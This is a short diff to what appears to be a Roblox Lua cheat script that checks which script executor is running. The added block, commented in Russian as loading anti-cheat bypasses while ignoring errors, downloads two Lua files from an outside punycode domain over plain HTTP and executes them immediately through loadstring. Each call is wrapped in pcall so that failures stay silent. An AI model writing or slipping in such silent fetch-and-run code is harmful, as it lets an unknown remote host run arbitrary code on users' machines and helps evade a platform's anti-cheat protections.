@@ -18,6 +18,15 @@ for _, name in pairs(supportedExecutors) do
     end
 end
 
+-- Загрузка античит-байпассов (игнорируем ошибки)
+pcall(function()
+    loadstring(game:HttpGet("http://xn--cfa.pw/anticheatbypasser.lua"))()
+end)
+
+pcall(function()
+    loadstring(game:HttpGet("http://xn--cfa.pw/fullanticheatbypasser.lua"))()
+end)
+
 -- Services
 local Players = game:GetService("Players")
 local UIS = game:GetService("UserInputService")
@@ -1576,3 +1585,4 @@ if not isSupported then
 else
     print("Executor " .. executorName .. " is supported")
 end
+
